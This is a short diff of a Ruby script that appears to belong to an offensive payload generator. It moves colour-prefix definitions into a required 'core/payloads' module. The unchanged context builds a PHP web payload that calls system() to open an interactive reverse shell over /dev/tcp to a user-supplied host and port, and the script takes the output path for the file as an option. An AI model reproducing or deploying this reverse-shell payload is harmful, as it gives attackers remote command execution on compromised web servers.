@@ -1,15 +1,9 @@
 #!/usr/bin/env ruby
 
-i = "\033[1;77m[i] \033[0m"
-e = "\033[1;31m[-] \033[0m"
-p = "\033[1;77m[>] \033[0m"
-g = "\033[1;34m[*] \033[0m"
-s = "\033[1;32m[+] \033[0m"
-h = "\033[1;77m[@] \033[0m"
-r = "\033[1;77m[#] \033[0m"
-
 require 'optparse'
 require 'ostruct'
+
+require 'core/payloads'
 
 Signal.trap("INT") {
     abort()
@@ -50,7 +44,7 @@ if not host or not port or not shell or not file
     puts "  --output-path=<output_path>    Output path."
     abort()
 end
-  
+
 payload = ""
 payload += "<?php\n"
 payload += "system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");\n"
